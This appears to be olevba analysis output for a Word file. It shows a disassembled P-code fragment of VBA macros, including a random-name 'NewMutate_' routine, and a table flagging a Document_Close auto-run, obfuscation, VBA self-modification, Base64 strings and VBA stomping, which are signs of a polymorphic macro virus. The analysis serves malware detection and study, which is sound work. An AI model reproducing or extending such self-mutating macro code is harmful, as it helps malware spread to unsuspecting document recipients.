' 	ArgsLd Mid 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ge 
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "Z"
' 	Le 
' 	And 
' 	IfBlock 
' Line #156:
' 	LitDI2 0x0002 
' 	St fl_ 
' Line #157:
' 	ElseBlock 
' Line #158:
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	LitStr 0x0001 "0"
' 	Ge 
' 	Ld a_ 
' 	Ld i_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid 0x0003 
' 	LitStr 0x0001 "9"
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St fl_ 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St fl_ 
' 	EndIf 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	Ld fl_ 
' 	St myVar_ 
' Line #161:
' 	EndFunc 
' Line #162:
' 	FuncDefn (Private Function NewMutate_(id_FFFE As Variant))
' Line #163:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #164:
' 	OnError (Resume Next) 
' Line #165:
' 	LitStr 0x0000 ""
' 	St Rnd 
' Line #166:
' 	StartForVariable 
' 	Ld i_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld _B_var_On 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #167:
' 	Ld Rnd 
' 	LitDI2 0x0061 
' 	Ld _B_var_On 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd CheckUp 0x0001 
' 	Add 
' 	St Rnd 
' Line #168:
' 	StartForVariable 
' 	Next 
' Line #169:
' 	Ld Rnd 
' 	St NewMutate_ 
' Line #170:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

